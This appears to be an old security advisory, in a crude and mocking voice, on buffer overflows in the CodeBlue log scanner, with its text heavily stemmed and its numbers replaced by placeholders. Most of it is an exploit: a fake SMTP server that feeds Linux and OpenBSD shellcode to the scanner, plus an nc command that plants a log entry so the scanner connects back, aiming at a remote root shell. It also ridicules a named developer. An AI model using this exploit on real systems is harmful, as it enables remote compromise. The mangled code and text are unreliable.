titl : potenti remot root in codeblu log scanner name : demi sex god from hell adv number date : ye , pleas mail me if you are femal ( send pictur ) crazi track number that make it look like i have some massiv databas of juarez : numberanumberbnumb prop to emailaddr inform -- -- -- -- -- - you may rememb me from sweati night of passion , or perhap from yesterday when i announc the releas of a piec of softwar i wrote ( mani year ago too btw ) . in gener i receiv no feedback from thi , cept from one guy have problem download it ( howd that go btw ? ) and then thi : from : `` michael '' to : `` 'demi sex god from hell ' '' subject : re : ass the attack spoof shell annoy . pointless . well ! how veri veri rude . that realli wa uncal for . ( propz to dme yo ! ) . gay , bi or curiou , i went to find out more about mystic michael , who is obvious veri import as he is the onli one who felt the need to tell me they didnt like me . it turn out , he a bit of programm , with some code avail on hi websit ( www.tenebrous.com ) . i got codeblu , ( btw mystic mike your auto-download script for you counter give me a number error ) , a log check util mystic mike wrote and releas under the gnu gpl to make the world a better place . if thi tool is run as root ( say nightli from root crontab ) there is a potenti remot root . in ani case , regardless of user , there is alway a remot . if codeblu is local suid , there mani overflow all throughout it , easi peasi like the girl in st patrick ! ! ! . note st patrick is a great place in sydney , playground of the rich and famou . visit it if you ever visit sydney , tell them i sent you . so let have a walk through the code , and get a feel for mystic mike , the man behind the mystic . ( do you wear a crazi robe with a hood like a monk mike ? ) dollar cd codeblu dollar ls chang copi makefil readm codeblue.c dollar head copi gnu gener public licens version number , june number copyright ( c ) number , number free softwar foundat , inc. number templ place , suit number , boston , ma number-numb usa everyon is permit to copi and distribut verbatim copi of thi licens document , but chang it is not allow . preambl /* uh-oh */ dollar vi codeblue.c /* * dollarhead : /usr/src/projects/codeblue/codeblue.c , v number.numb number/number/numb number : number : number * root exp root dollar * ****************************************************************************************** * - [ g o d b l e s s a m e r i c a ] - * ****************************************************************************************** * * codeblu vnumber.numb by michael emailaddr * thi softwar is freeli distribut under the term of the gnu/gpl . * pleas see file 'copying' /* god bless america , and mystic mike ! */ ... . /* line ~number */ /* * siginal_init : * set up all the signal we 'd like * to handl special */ void signal_init ( void ) { struct sigact sa_old , sa_new ; /* signal handl */ sa_new.sa_handl = signal_handl ; sigemptyset ( & sa_new.sa_mask ) ; sa_new.sa_flag = number ; sigact ( sigint , & sa_new , & sa_old ) ; sigact ( sigpip , & sa_new , & sa_old ) ; } /* share signal handler do all sort of stuff , not veri good mike : ( */ /* line ~number */ /********************************************************************* * our close ( ) wrapper */ int close ( int sd ) { return ( close ( sd ) ) ; } /* that just made me laugh */ /* line ~number */ char loglin [ number ] ; /* loglin is global */ int scan_fil ( file * fp ) { char buffer [ number ] ; ... . fget ( buffer , number , fp ) ; ... . if ( found_infect == number ) { /* if it pick up a worm entri in the */ /* log thi is true */ strcpi ( loglin , buffer ) ; /* oh dear */ /* line ~number */ char repli [ number ] ; /* global */ char whoispath [ number ] = `` /usr/bin/whoi '' ; /* global */ int main ( int argc , char **argv ) { ... .. if ( argv [ i ] [ number ] == '- ' ) switch ( argv [ i ] [ number ] ) { case 'e ' : { /* return email address */ if ( ( ! argv [ i + number ] ) || ( argv [ i + number ] [ number ] == '- ' ) ) diewithrequir ( argv [ i ] ) ; strcpi ( repli , argv [ i + number ] ) ; break ; } case 'p ' : { /* path to whoi binari */ if ( ( ! argv [ i + number ] ) || ( argv [ i + number ] [ number ] == '- ' ) ) diewithrequir ( argv [ i ] ) ; strcpi ( whoispath , argv [ i + number ] ) ; break ; } /* whoop ! */ now , all thi is good for a laugh , but unless it suid , not much use : ( codeblu will scan apache/squid logfil look for code red and nimda log hit . if it find a hit , it will connect to the sourc ip adress of the hit and send an email warn of infect . unfortun , mystic mike wa too far up on hi high hors to write someth decent . the function that doe thi is send_email ( ) ( line ~number ) it start off like thi : int send_email ( void ) { int sd ; char *host = malloc ( sizeof ( char ) * number ) ; /* ... . silli crap use popen and stuff ... . */ /* host is the infect host from the logfil * thi will connect to the host on port number */ if ( ( sd = smtp_connect ( host ) ) = smtp_timeout ) { fprintf ( stderr , `` [ error : oper time out\n '' ) ; fprintf ( log , `` ... .. error : oper time out\n '' ) ; return -number ; } elapsed++ ; usleep ( smtp_timeout * number ) ; continu ; } els { if ( ! ( flag & fl_bequiet ) ) fprintf ( stderr , `` [ error : recv ( ) fail : % s\n '' , strerror ( errno ) ) ; fprintf ( log , `` ... .. error : recv ( ) fail : % s\n '' , strerror ( errno ) ) ; return -number ; } } if ( ( respons [ i ] == '\n ' ) || ( ( respons [ i ] == '\n ' ) & & ( respons [ i + number ] == '\n ' ) ) ) break ; i++ ; /* come here often babi ? */ } so slowli but sure , respons is overrun , unless it it a newlin . /* * hi , thi is an exploit that doesnt work . it should be enough of a point in * the right direct though . the overflow is in get_smtp_repli ( ) , codeblue.c * is pretti damn poor , there are more ! ! ! * * be in a funni mood one afternoon , i made some softwar publicli * avail , the next morn i see thi in my mailbox : * * -- -- -- - begin spout off -- -- -- * from emailaddr mon jul number number : number : number number * return-path : * delivered-to : emailaddr * receiv : ( qmail number invok from network ) ; number jul number number : number : number -number * receiv : from mailnumber.mail.bellsouth.net ( helo imfnumberbis.bellsouth.net ) * ( number.number.number.numb ) * by orbital.wiretapped.net with smtp ; number jul number number : number : number -number * receiv : from michael ( [ number.number.number.numb ] ) by imfnumberbis.bellsouth.net * ( intermail vm.number.number.number.numb number-number-number-number-number-numb ) with esmtp * id * for ; mon , number jul number number : number : number -number * from : `` michael '' * to : `` 'demi sex god from hell ' '' * subject : re : ass the attack spoof shell * date : mon , number jul number number : number : number -number * message-id : * mime-vers : number.numb * content-typ : text/plain ; * charset= '' us-ascii '' * content-transfer-encod : numberbit * x-prioriti : number ( normal ) * x-msmail-prior : normal * x-mailer : microsoft outlook , build number.number.numb * import : normal * x-mimeol : produc by microsoft mimeol vnumber.number.number.numb * in-reply-to : * statu : ro * * annoy . pointless . * * -- -- -- - end spout off -- -- -- - * * how emailaddr * * so i had a visit to www.tenebrous.com , found some softwar written by thi * master coder , and here we are now . * * to use thi against a webserv ( a ) use codeblu . * * dollar printf `` get /scripts/root.exe\r\n\r\n '' | nc a number * * thi will add an entri in the access log . * * on the same host : * * # ./mystic_anu number * * wait a while . * * when codeblu run it will pull your ip from the log , connect to your port * number and tri to send you a mail . becaus mystic is an idiot , you will get a * shell with the openbsd code ! ! ! * * i like exclam mark ! ! ! ! * * krad haxxor prop : dedmunk ( happi emailaddr phnumberllnumberp , caddi , buo , solac , * everyon on # cw , everyon in pari ( you have a love citi , i had a love * time last weekend , thankyou ! ! ! ) dedmunk , everyon at netcraft ( esp mike , * hi ! ) , everyon in sydney , dedmunk , everyon i go drink with , anyon who * live in london , marlinspik ( yo ! ) , the woman who sell me my cigarett in * the morn on the way into work , thoma green , dedmunk , adam , durab , shnumbert . * * big shout out to toliman and zero sum , understand ! ! * * propz to emailaddr * * dont forget : * * dollarhead : /usr/src/projects/codeblue/codeblue.c , v number.numb number/number/numb number : number : number root exp root dollar * ****************************************************************************************** * - [ g o d b l e s s a m e r i c a ] - * ****************************************************************************************** * */ # includ # includ # includ # includ # includ # includ # includ # includ # includ # defin of number /* thi is bigger than need */ /* optim the code , now it work better in bad situat */ /* i dont know who wrote thi , sorri , if you wrote it , let me know */ char lunix_shellcod [ ] = '' \xnumber\xenumber\xnumber\xdnumber\xbnumber\xnumber\xnumber\xdnumber\xnumber\xcnumber\xnumber\xcb\xnumber\xnumber\xnumberd\xfnumb '' '' \xnumber\xnumber\xnumberd\xfnumber\xnumberb\xnumber\xnumberd\xfc\xnumberd\xnumberd\xfnumber\xcd\xnumber\xnumber\xcnumber\xnumb '' '' \xnumber\xfnumber\xnumber\xnumber\xnumber\xnumberd\xec\xnumber\xcnumber\xnumber\xee\xnumberf\xnumber\xnumber\xnumberd\xfnumb '' '' \xnumberd\xnumber\xec\xnumber\xnumber\xfnumber\xcnumber\xnumber\xfc\xnumber\xnumber\xdnumber\xnumberd\xnumberd\xfnumber\xcd '' '' \xnumber\xnumber\xdnumber\xnumber\xnumber\xcd\xnumber\xnumber\xdnumber\xnumber\xcd\xnumber\xnumber\xcnumber\xnumber\xcnumb '' '' \xbnumber\xnumberf\xnumber\xdnumber\xcd\xnumber\xnumber\xdnumber\xnumber\xcd\xnumber\xeb\xnumber\xnumbere\xnumber\xnumb '' '' \xnumber\xnumber\xcnumber\xnumber\xnumber\xnumber\xnumber\xnumber\xnumberc\xbnumber\xnumberb\xnumber\xfnumber\xnumberd\xnumberd\xnumb '' '' \xnumberd\xnumber\xnumberc\xcd\xnumber\xenumber\xenumber\xff\xff\xff/bin/sh '' ; /* shell on port number/tcp shellcod for openbsd by noir */ long bsd_shellcod [ ] = { numberxnumbercnumb , numberxnumb , numberxnumberbnumbercnumb , numberxnumbercd , numberxnumberfnumbercnumb , numberxnumbercnumb , numberxnumberfnumb , numberxnumbercnumb , numberxnumberanumberb , numberxnumberd , numberxnumberb , numberxnumberbnumbercnumb , numberxnumberanumbercd , numberxnumberb , numberxnumberabnumbercnumb , numberxcnumbercd , numberxnumberbnumb , numberxcnumb , numberxnumbercdnumberebnumb , numberxcnumb , numberxnumberbnumb , numberxbnumbercnumb , numberxnumbercdnumbera , numberxnumberfnumb , numberxnumberbnumberebef , numberxcnumberfnumb , numberxnumberbnumb , numberxnumberdnumberf , numberxnumberbnumb , numberxcnumb , numberxnumbercdnumberbbnumb , numberxnumbercnumb , numberxnumberbnumbercnumb , numberxdnumberenumbercd , numberxnumberfffffff , numberxnumberfnumberenumb , numberxnumb } ; int main ( int argc , char *argv [ ] ) { struct sockaddr_in sock_in ; struct sockaddr_in sock_out ; char *port = `` number '' ; int fd , a ; int len ; int opt ; char bigbuf [ of ] ; char *p ; long lunix_resp = numberxbfffenumberac ; long bsd_resp = numberxdfbfcnumb ; char *moo = `` number `` ; long resp = lunix_resp ; char *shellcod = lunix_shellcod ; printf ( `` strlen scode = % d\n '' , strlen ( shellcod ) ) ; if ( argc == number ) port = argv [ number ] ; if ( argc > number ) { fprintf ( stderr , `` useg : % s [ port ] \n '' , argv [ number ] ) ; exit ( number ) ; } resp += number ; p = bigbuf ; memcpi ( p , moo , number ) ; p += number ; memset ( p , '\xnumber ' , number - strlen ( shellcod ) ) ; p += number - strlen ( shellcod ) ; memcpi ( p , shellcod , strlen ( shellcod ) ) ; p += strlen ( shellcod ) ; memcpi ( p , & resp , number ) ; p += number ; memcpi ( p , & resp , number ) ; p += number ; memset ( p , '\n ' , number ) ; if ( ( fd = socket ( pf_inet , sock_stream , number ) ) < number ) { perror ( `` socket '' ) ; exit ( number ) ; } memset ( & sock_in , number , sizeof ( sock_in ) ) ; sock_in.sin_famili = af_inet ; sock_in.sin_port = hton ( atoi ( port ) ) ; sock_in.sin_addr.s_addr = inaddr_ani ; len = sizeof ( sock_in ) ; opt = number ; if ( setsockopt ( fd , sol_socket , so_reuseaddr , & opt , sizeof ( int ) ) == -number ) { perror ( `` setsockopt '' ) ; exit ( number ) ; } if ( bind ( fd , ( struct sockaddr * ) & sock_in , len ) < number ) { perror ( `` bind '' ) ; exit ( number ) ; } if ( listen ( fd , number ) < number ) { perror ( `` listen '' ) ; exit ( number ) ; } printf ( `` listen on port % d\n '' , atoi ( port ) ) ; for ( ; ; ) { len = sizeof ( sock_out ) ; if ( ( a = accept ( fd , ( struct sockaddr * ) & sock_out , & len ) ) < number ) { perror ( `` accept '' ) ; exit ( number ) ; } printf ( `` got a connect from % s\n '' , inet_ntoa ( sock_out.sin_addr ) ) ; fflush ( stdout ) ; write ( a , bigbuf , sizeof ( bigbuf ) ) ; close ( a ) ; } return ( number ) ; }